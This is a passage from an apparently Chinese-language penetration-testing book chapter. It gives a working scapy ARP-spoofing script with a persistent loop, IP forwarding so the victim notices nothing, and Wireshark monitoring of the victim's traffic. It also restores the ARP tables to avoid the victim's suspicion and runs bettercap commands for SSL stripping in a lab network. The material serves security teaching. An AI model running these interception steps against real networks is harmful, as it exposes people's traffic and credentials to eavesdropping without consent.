  ```\nfrom scapy.all import *\n\ndef spoof_victim():\n    arp_response = ARP()\n\
  \    arp_response.op = 2\n    arp_response.pdst = \"192.168.74.129\"\n```\n\n\n\n\
  arp_response.hwdst = \"00:0C:29:BE:47:14\"\narp_response.hwsrc = \"00:0c:29:90:79:02\"\
  \narp_response.psrc = \"192.168.74.2\"\nsend(arp_response)\n\ndef spoof_router():\n\
  \    arp_response = ARP()\n    arp_response.op = 2\n    arp_response.pdst = \"192.168.74.2\"\
  \n    arp_response.hwdst = \"00:50:56:ff:74:8b\"\n    arp_response.hwsrc = \"00:0c:29:90:79:02\"\
  \n    arp_response.psrc = \"192.168.74.129\"\n    send(arp_response)\n\nif __name__\
  \ == \"__main__\":\n    spoof_victim()\n    spoof_router()\n\n请注意，这只会欺骗这些设备一次。要创建永久欺骗，我们可以将这些函数调用添加到循环中，并在一定的延迟后持续发送这些数据包。这样，ARP\
  \ 表就不会有机会重置，只要你的欺骗程序在运行，你就可以永久欺骗这些设备。\n\n我们也可以尝试在循环中加入退出条件。我们将使用 KeyboardInterrupt\
  \ 来退出。使用以下代码在每隔 2 秒的延迟后持续发送数据包：\n\n```\ntry:\n    while True:\n        spoof_victim()\n\
  \        spoof_router()\n        time.sleep(2)\nexcept KeyboardInterrupt as err:\n\
  \    print(\"exiting\")\n```\n\n请注意，你需要在文件的顶部导入 time 模块。虽然我们的欺骗程序看起来已经完成，但有一个小问题——如果受害者现在尝试请求互联网服务器，他们将看到互联网连接问题。在\
  \ Linux 上运行 arp 欺骗程序，然后去 Windows 机器尝试访问一个网站。你会看到类似如下的窗口：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_116_0.png)\n\
  \n图 5.11 – 无连接\n\n这是因为数据包正在前往 Kali 机器，但它阻止了数据包被转发。要启用数据包转发，在你的 Linux 终端上运行以下命令：\n\
  \n```\nsysctl -w net.ipv4.ip_forward=1\n```\n\n这将在 Kali 机器上启用 IP 转发。现在，Windows 用户将能够在完全没有察觉有人拦截其流量的情况下访问互联网：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_116_1.png)\n\n图 5.12 – 启用 IPv4 转发\n\n\
  现在，如果你去 Windows 机器再次尝试访问一个网站，你应该有互联网连接。现在，你的欺骗程序应该能完美运行。\n\n## 监控流量\n\n要查看用户在做什么，你可以在\
  \ Kali 上打开 *Wireshark* 并选择 `eth0` 接口以查看网络上所有经过的流量。要仅查看来自 Windows 机器的流量，你可以在过滤器菜单中设置一个过滤器。使用以下过滤器：\n\
  \n```\nip.src == 192.168.74.129\n```\n\n这将只显示源自 Windows 机器的流量。现在，如果你去 Windows 机器并访问一个网站，你应该能在\
  \ Wireshark 中看到数据包到达：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_117_0.png)\n\n\
  图 5.13 – 来自 Windows 机器的 Wireshark 流量\n\n在本节中，我们学习了如何中毒 ARP 表并监控受害设备与互联网之间的网络流量。在下一节中，我们将学习这种网络流量是如何加密的，以及这种加密是如何被破解的。\n\
  \n## 加密流量\n\n在互联网早期，互联网流量大多基于文本，因此在网络上嗅探的任何人都可以清楚地看到正在传输的内容。这极不安全，人们无法在网络上传输密码等敏感信息。自那以后，互联网已经取得了长足的进步。现在，除了一些非常老旧的网站外，大多数互联网流量都是安全的并使用加密。这意味着即使你可以看到流量，你也无法读取它，因为它是加密的。如果你在网站的\
  \ URL 上看到 `https` 标签，这意味着网络流量是加密的，无法在传输中被读取。有工具可以用来解密这种流量。\n\n## 手动恢复 ARP 表\n\n\
  现在我们已经看到了如何成功欺骗数据包，当我们使用键盘中断（如 Ctrl + C）关闭程序时，我们会发现 Windows 机器上的互联网再次变得不可用。这是因为\
  \ ARP 表已被中毒，我们没有恢复它们，因此它们不知道如何路由网络流量。这会在几分钟后自动重置。然而，这可能会引起受害者的怀疑，他们可能会意识到有人在篡改他们的网络流量。为了避免这种情况，我们可以在退出程序时发送正确的信息来恢复这些表。我们可以使用以下程序来恢复正确的值：\n\
  \n```\ndef restore():\n    # restoring router table\n    arp_response = ARP()\n\
  \    arp_response.op = 2\n    arp_response.pdst = \"192.168.74.2\"\n    arp_response.hwdst\
  \ = \"00:50:56:ff:74:8b\"\n    arp_response.hwsrc = \"00:0C:29:BE:47:14\"\n    arp_response.psrc\
  \ = \"192.168.74.129\"\n    send(arp_response)\n    #restoring windows table\n \
  \   arp_response = ARP()\n    arp_response.op = 2\n    arp_response.pdst = \"192.168.74.129\"\
  \n    arp_response.hwdst = \"00:0C:29:BE:47:14\"\n    arp_response.hwsrc = \"00:50:56:ff:74:8b\"\
  \n    arp_response.psrc = \"192.168.74.2\"\n    send(arp_response)\n```\n\n请注意，这些值是针对我的平台的；它们在你的平台上会不同，因此你应相应地更改这些值。要恢复\
  \ ARP 表，从我们的 Linux 机器向路由器发送这些值，同时假装是设备 A。这次，不要输入虚假信息，输入正确的值。对 Windows 机器做同样的操作。最后，在发生键盘中断时调用此函数，如下所示：\n\
  \n```\ntry:\n    while True:\n        spoof_victim()\n        spoof_router()\n \
  \       time.sleep(2)\nexcept KeyboardInterrupt as err:\n    print(\"restoring ARP\
  \ tables\")\n    restore()\n    print(\"exiting\")\n```\n\n在本节中，我们学习了如何中毒 ARP 表、监控网络流量，以及在受害机器中恢复\
  \ ARP 表以确保他们不会怀疑我们的活动。接下来，我们将学习如何解密这种网络流量。\n\n## 解密网络流量\n\n正如我们在上一节中看到的，我们可以使用中间人攻击来拦截流量。然而，这种攻击单独使用很少有用，因为现在的浏览器流量都是加密的，所以即使你能够拦截流量，你也做不了太多。你可以通过使用\
  \ SSL 剥离来绕过此过程。拦截未加密的流量有时也很实用，当你想监控用户的活动时。这可以帮助你找出用户访问最多的网站。将此信息与社会工程攻击结合使用可以帮助你入侵受害者的机器。\n\
  \n## HTTPS 与 HTTP\n\n要理解 SSL 剥离的工作原理，我们需要了解超文本传输协议 HTTP 和 HTTPS 协议的工作原理。HTTPS 是\
  \ HTTP 的安全版本，正如其名称末尾的 S 所指示的那样。它是在互联网早期开发的，当时信息以人类可读文本的形式发送，任何拦截或监控流量的人都可能看到正在发生的事情。\n\
  \n一个典型的 **HTTP** 请求看起来像这样：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_120_0.png)\n\
  \n图 5.14 – HTTP 请求\n\n正如你所见，HTTP 请求的主体是以纯文本形式存在的，这意味着它可以被轻松读取。因此，如果你以明文形式向服务器发送你的电子邮件或密码，黑客可能窃取你的凭据。你已经知道这有多危险。为了避免这个问题，开发了\
  \ HTTPS，它可以加密消息的主体，以便只有服务器和请求方可以用正确的加密密钥读取它——中间人无法读取它。一旦服务器收到请求，它将以适当的回复进行响应。服务器的回复看起来像这样：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_120_1.png)\n\n图 5.15 – HTTP 回复\n\n最后一行代表回复的主体，即用户请求的网页。在\
  \ HTTPS 的情况下，这些请求和响应的 *主体* 将被加密，对攻击者来说看起来像乱码。现在，让我们专注于如何绕过它。\n\n\n\n\n\n## 绕过 HTTPS\n\
  \n尽管如今大多数网站都支持 HTTPS 而非 HTTP，但在服务器端，为了保持向后兼容，服务器仍然允许请求来自 *HTTP*，一旦收到请求，就会检查客户端/请求方是否支持\
  \ HTTPS。我们可以利用这一点来绕过此安全机制。下面的图表展示了 HTTP 请求与 Web 服务器的工作方式：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_121_0.png)\n\
  \n图 5.16 – HTTP 循环\n\n当客户端首次访问一个网站时，通常使用 HTTP 协议，因此它会发送一个不安全的请求来建立连接。服务器收到此请求后，会询问客户端是否支持\
  \ HTTPS。如果客户端支持 HTTPS，服务器会说，*为什么不通过 HTTPS 与我交谈呢？*。客户端随后切换到 *HTTPS*。一旦发生这种情况，所有的通信都会被加密。\n\
  \n这就是我们引入中间人 *攻击者* 的地方。我们将以一种欺骗服务器和客户端的方式进行。让我们看一下下面的图表：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_122_0.png)\n\
  \n图 5.17 – 使用 SSL 剥离的 MITM 攻击\n\n在第一阶段，客户端会向服务器发出 HTTP 请求。攻击者坐在客户端和服务器之间，并使用我们在上一章中开发的\
  \ arp spoofing 程序来监控流量。他们会从客户端获取此请求，将其转换为 HTTPS 请求，然后转发给服务器。服务器会认为客户端是通过 HTTPS 而非\
  \ HTTP 在交谈。同样，攻击者会接收来自服务器的回复，对其解密并读取正在发生的事情。完成之后，他们会将回复转发给受害者/客户端。这样，受害者会认为服务器是通过\
  \ HTTP 交谈，而服务器会认为客户端是通过 HTTPS 交谈。与此同时，攻击者正在读取所有网络流量。\n\n攻击者的工作是加密和解密服务器用于在传输层进行身份验证的\
  \ SSL 证书。它们构成了安全通信的基础。学习如何执行 SSL 剥离超出了本书的范围，因为它需要广泛的网络知识，这本身就可以是一本书。我们的目标是使用此工具来破坏系统。我们将使用一个著名的\
  \ SSL 剥离工具 bettercap 来实现。我们将使用版本 2.23。请注意，此组件的最新工具似乎无法正常工作。它可以在 https://github.com/bettercap/bettercap/releases/download/v2.23/bettercap_linux_amd64_2.23.zip\
  \ 获取。\n\n下载此工具并在 Linux 上运行。\n\n下载后，将此压缩文件放在 Kali Linux 上的所需位置并解压模块。你会看到一个名为 bettercap\
  \ 的可执行文件。你可以直接运行此可执行文件，它会正常工作。然而，我建议将其放在 /usr/bin/ 目录中，以便你可以从任何地方访问它，因此将此文件复制到 /usr/bin/。\n\
  \n要复制文件，请使用以下命令：\n\n```\nsudo cp bettercap /usr/bin/bettercap\n```\n\n复制后，只需打开一个终端并输入\
  \ bettercap 即可运行文件。在继续之前，我们需要做几件事来启动它。输入以下命令：\n\n```\nsudo bettercap\n```\n\n界面将如下所示：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_123_0.png)\n\n接下来，你需要更新一些内容；即此模块的一些内部文件，称为\
  \ caplets。别担心——你在这里不需要了解太多关于 caplets 的内容。只需输入以下命令，让魔法发生即可：\n\n```\ncaplets.update\n\
  ```\n\n这将下载一些文件并更新它们。\n\n退出此程序以使更改生效。现在，让我们再次使用以下命令运行程序：\n\n```\nsudo bettercap\
  \ --silent -iface eth0\n```\n\n此命令将以静默模式运行 bettercap，同时使用 eth0 作为其主要网络接口。要查看网络上有哪些设备可用，你可以输入以下命令：\n\
  \n```\nnet.probe on\n```\n\n此命令的输出将如下所示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_124_0.png)\n\
  \n图 5.19 – 网络上的活动主机\n\n让我们尝试为此应用程序使用内部 arpspoof 程序。输入以下命令为我们的 Windows 机器设置 arp spoofing：\n\
  \n```\nset arp.spoof.targets 192.168.74.129\n```\n\n这将设置受害者。要启动 arp spoofing 程序，我们可以输入以下命令：\n\
  \n```\nset arp.spoof.internal true\n```\n\n```\nset arp.spoof on\n```\n\n这将开始欺骗设备：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_124_1.png)\n\n图 5.20 – 设备欺骗\n\n此时，我们来到了\
  \ SSL 剥离部分。要开始剥离 HTTPS 流量，我们需要转到 Windows 机器并清除所有浏览历史记录。这将确保我们不会加载网站的缓存版本。\n\n如果你想查看\
  \ bettercap 上正在运行哪些服务，可以使用以下帮助命令：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_125_0.png)\n\
  \n图 5.21 – 帮助命令\n\n接下来，要查看原始 HTTP 流量，运行以下命令：\n\n```\nhstshijack/hstshijack\n```\n\
  \n这将开始剥离流量。现在，如果你转到 Windows 机器并访问 google.com 等网站，你会看到网站连接是不安全的。如果你访问 google.com，你会注意到\
  \ URL 前有一个 Not secure 标签。\n\n你现在应该拥有一个不安全的 Google 版本。如果你转到运行 bettercap 的 Kali Linux\
  \ 终端，你应该能看到网络流量。\n\n**注意！**\n请注意，像 Google、Facebook 等大公司在安全上花费了巨额资金，并不断努力改进其保护方法，因此今天有效的攻击明天可能就不起作用了。这就是为什么渗透测试人员和网络安全防御团队不断处于追逐游戏中。前面示例的目标是展示这些方法在实践中如何运作。到你自己使用时，情况可能已经改变，此攻击方法可能有效也可能无效。保持更新非常重要。本书的目的是不是让你困在特定工具的使用上，而是向你展示渗透测试人员和安全分析师的思考方式。\n\
  \n## 总结\n\n在本章中，我们在上一章学到的知识基础上，使用它构建了一个 ARP spoof 程序，使我们能够拦截本地网络上的流量。然后，我们学习了 HTTP\
  \ 和 HTTPS 协议的工作原理，以及它们如何被中间人攻击破坏。\n\n在下一章中，我们将探讨一个更令人兴奋的话题：恶意软件开发。这可以帮助我们手动接管受害者的机器并在其上执行某些任务。通过这样做，我们将学习如何构建恶意软件\
  \ **远程访问工具** 来控制受害者的计算机。我们将构建一个程序，使我们能够远程接管受害者的机器并在其上执行多个任务。下一章见！\n"
